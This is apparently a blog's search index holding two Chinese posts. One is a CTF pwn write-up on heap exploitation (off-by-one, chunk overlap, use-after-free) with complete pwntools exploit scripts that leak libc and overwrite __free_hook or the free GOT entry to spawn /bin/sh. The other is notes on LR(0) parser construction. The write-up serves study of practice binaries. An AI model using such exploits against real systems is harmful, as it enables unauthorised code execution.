<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>heap利用</title>
    <url>/2024/08/01/heap%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h1><p>在一个可以写的区域伪造chunk（通过off-by-one使系统的指向chunk的指针能指向伪造chunk）</p>
<p><strong>注意chunk的大小的构造</strong></p>
<p><strong>其中指针有多层，因此可以泄露并且修改，p2地址泄露之后，覆盖p2为想要操作的地址，将p4将内容改为想要的内容</strong></p>
<ol>
<li><strong>p1-&gt;p2-&gt;内容</strong></li>
<li><strong>p1-&gt;p4-&gt;内容(更改p1的值)</strong></li>
</ol>
<p><strong>3.p1-&gt;p4-&gt;新内容（更改p1的指向的值）</strong></p>
<p><strong>对于一二步骤p1在第二层，但是对于第一步骤p1在第一层</strong></p>
<p><strong>想更改p1的间接内容，需要更新p1的指向为p4，需要把p1移到第二层（先泄露&amp;p1，然后再一个块的内部伪造一个新的chunk，其中放入&amp;p1，成功将其到第二层），通过fakechunk的一些操作可以更改p1的值（也就是改为&amp;p4），这样可以更改p4指向的内容，那么p1应该改成什么（改成泄露的重要地址，此题通过p1的指向来泄露，也就是&amp;p4和&amp;p2有着千丝万缕的关系）</strong></p>
<p><strong>更改p的值，和p的指向的值</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">id</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;ID: &quot;</span>)</span><br><span class="line">        book_id = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">        <span class="built_in">print</span>(book_id)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Name: &quot;</span>)</span><br><span class="line">        book_name = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_name)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Description: &quot;</span>)</span><br><span class="line">        book_des = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_des)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Author: &quot;</span>)</span><br><span class="line">        book_author = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_author)</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id, new_des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>,book_id)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter new book description: &quot;</span>,new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(book_id).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exitpro</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter author name: &quot;</span>,<span class="number">32</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">createbook(<span class="string">&quot;32&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;272&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">createbook(<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(book_author[<span class="number">32</span>:<span class="number">38</span>])</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">p2vmmap = book1_addr+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(p2vmmap))</span><br><span class="line"></span><br><span class="line">payload=(<span class="number">0x58</span>+<span class="number">0x60</span>)*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0x1</span>)+p64(p2vmmap)+p64(p2vmmap)+p64(<span class="number">0x20</span>)</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>, payload)</span><br><span class="line">changename(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line">book2_des_addr=u64(book_des.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base=book2_des_addr-<span class="number">0x5a3010</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">sysbin = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;sysbin:&quot;</span>+<span class="built_in">hex</span>(sysbin))</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>,p64(free_hook))</span><br><span class="line">editbook(<span class="string">b&#x27;2&#x27;</span>,p64(sysbin))</span><br><span class="line">createbook(<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="overslaping"><a href="#overslaping" class="headerlink" title="overslaping"></a>overslaping</h1><p><strong>和off-by-one有异曲同工之处，相同在，想方设法越权控制chunk字段，此方法就是将小chunk包含再大chunk之中，虽然我不能控制小chunk但是我可以控制大chunk进而控制小chunk，但是控制小chunk也是通过大chunk的某些字段实现，因此当更改小chunk某些字段之后，大chunk就失效了，因此只能利用一次，在一个地址处进行读写，此题是freegot</strong></p>
<p><strong>此题成功点在于fastbin的利用，fastbin的安全检查太少，链入链表只会检查和头是否重复，可以看出fastbin是一个用来攻击的破解点，需好好利用</strong></p>
<p><strong>此题的另一个重要漏洞是free参数的传递，其会直接传递用户指针，这样子参数就可控了</strong></p>
<p><strong>而想要控制大chunk包含小chunk需要溢出大chunk的size字段，使其可以包含小chunk</strong></p>
<p><strong>比较有意思的一点是假的chunk居然可以欺骗pwngdb，由此可以估计出pwngdb的实现就是通过简单的观察heap的相应字段实现的，哈哈哈哈</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param index: bytes(0 begin)</span></span><br><span class="line"><span class="string">    :param content: bytes</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size : &quot;</span>)</span><br><span class="line">    size = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="built_in">print</span>(size)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;152&#x27;</span>,<span class="number">144</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>))</span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">create(<span class="string">b&#x27;10&#x27;</span>,<span class="number">10</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x91</span>)+<span class="number">128</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freegot = pro.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freegot))</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;104&#x27;</span>,<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x70</span>)+p64(freegot)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">size,content = show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freeadd = u64(content.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(size,<span class="built_in">hex</span>(freeadd))</span><br><span class="line">base = freeadd - elf.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sysadd = elf.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(sysadd))</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#create(b&#x27;10&#x27;,10*b&#x27;c&#x27;)</span></span><br></pre></td></tr></table></figure>

<h1 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h1><p><strong>和前两者思路差不多基本上就是超越权限的指针访问，当指针free掉但是没有释放，那么低权限的用户再次使用可以更改高权限用户的数据，接着利用高权限的野指针可以访问到想访问到的东西</strong></p>
<p><strong>此题是hacknote，是一道教学题比较基础</strong></p>
<p><strong>py代码如下</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.buuoj.cn&quot;,29954)</span></span><br><span class="line">io = process(<span class="string">&quot;hacknote&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">create(<span class="string">b&#x27;12&#x27;</span>,p32(magic))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="string">b&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>heap利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>关于parser的语法树生成算法（实现）</title>
    <url>/2024/08/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86paser%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Week-5-and-Week-6"><a href="#Week-5-and-Week-6" class="headerlink" title="Week 5 and Week 6"></a>Week 5 and Week 6</h2><blockquote>
<p>首先是提出算法实现前的一些铺垫，主要包括以下知识：</p>
<p>1.Top-Down and Bottom-Up</p>
<p>2.Shift-Reduce Parsing</p>
<p>3.一些notation为了算法实现做铺垫</p>
</blockquote>
<h3 id="1-Top-Down-and-Bottom-Up"><a href="#1-Top-Down-and-Bottom-Up" class="headerlink" title="1.Top-Down and Bottom-Up"></a>1.Top-Down and Bottom-Up</h3><p>Top-Down对应先前讲的leftmost，而Bottom-Up则对应先前讲的rightmost，Week 4是从易于理解的角度讲解，而本周则是从实现的角度讲解。主要涉及到了如何shift，如何reduce，以及如何生成树，但是没有讲什么时候。</p>
<h3 id="2-Shift-Reduce-Parsing"><a href="#2-Shift-Reduce-Parsing" class="headerlink" title="2.Shift-Reduce Parsing"></a>2.Shift-Reduce Parsing</h3><p>基于Top-Down and Bottom-Up引出的语法解析实现的简单模型，初步引入了一些notation，如</p>
<p><img src="/img/mypic/com/192717-17226163867168.png" alt="192717"></p>
<p>主要解决了在哪reduce的问题<img src="/img/mypic/com/192952-17226163831407.png" alt="192952"></p>
<p>期间讲了一个插曲，也就是冲突（conflict）的解决方法：</p>
<p>一个为：shift和reduce的冲突，可被precedence and associativity declaration修复，类似于leftmost 或者rightmost，如加法和乘法的优先级。</p>
<p>另一个： reduce-reduce conflict，不知道该选择哪一个规则，说明： There is ambiguity in the grammar ，Might be fixed by additional lookahead，这个类似于两个规则冲突</p>
<h3 id="3-When-to-shift-reduce"><a href="#3-When-to-shift-reduce" class="headerlink" title="3.When to shift&#x2F;reduce?"></a>3.When to shift&#x2F;reduce?</h3><p>接着讲什么时候解决冲突，主要引入了prefix and handle</p>
<p><img src="/img/mypic/com/193651-17226163759036.png" alt="193651-17226163759036"></p>
<p>然后将了语法规范（specific）和parser的关系，核心在这张图：基本观点是，规范越简单解析器越简单，解析器无法准确识别所用的上下文无关语法（CFG），解析器的实现也需要效率和功能的trade-off</p>
<p><img src="/img/mypic/com/193848-17226163733105.png" alt="193848-17226163733105"></p>
<h3 id="3-When-to-shift-reduce-realize"><a href="#3-When-to-shift-reduce-realize" class="headerlink" title="3.When to shift&#x2F;reduce?realize"></a>3.When to shift&#x2F;reduce?realize</h3><h4 id="algorithm-1（LR0）"><a href="#algorithm-1（LR0）" class="headerlink" title="algorithm 1（LR0）"></a>algorithm 1（LR0）</h4><blockquote>
<p>关键在于构造action和goto两张表格</p>
<p>构造上述两张表格需要知道Configuration set</p>
<p>构造configuration set需要知道如何计算Closure property</p>
</blockquote>
<ul>
<li><p>action和goto表格的状态转移可看下表：</p>
<p>只需要注意一点的就是其状态转移只和stack头的元素有关，当弹出元素之后的状态转移也是如此</p>
<p><img src="/img/mypic/com/235730.png" alt="235730"></p>
</li>
<li><p>closure的构造</p>
<p>把所有的非终结符递归的转换即可</p>
<p><img src="/img/mypic/com/000108-17226163667684.png" alt="2024-08-03 000108-17226163667684"></p>
</li>
<li><p>Successor(I, X)的构造</p>
<blockquote>
<p>类似于状态转移后的状态的构造，状态转移需要移动圆点</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240803000246178.png" alt="image-20240803000246178"></p>
</li>
<li><p>configuration set的构造</p>
<p><img src="/img/mypic/com/image-20240803000332150-17226163592833.png" alt="image-20240803000332150"></p>
</li>
<li><p>action和goto的表格获得</p>
<p><img src="/img/mypic/com/image-20240803000701647-17226163557042.png" alt="image-20240803000701647"></p>
</li>
<li><p>需要注意的地方</p>
<blockquote>
<p>1.状态不要重复，状态也不能少</p>
<p>2.若出现冲突说明grammar定义的不好</p>
</blockquote>
<p>如此例子：则出现了reduce和shift冲突和reduce和reduce冲突，注意有的并非冲突，可以一个状态多次操作</p>
<p><img src="/img/mypic/com/image-20240803000826163-17226162670141.png" alt="image-20240803000826163"></p>
<p><img src="/img/mypic/com/image-20240803001104451.png" alt="image-20240803001104451"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>cs</category>
        <category>compiler</category>
      </categories>
      <tags>
        <tag>cs</tag>
        <tag>compiler</tag>
      </tags>
  </entry>
</search>
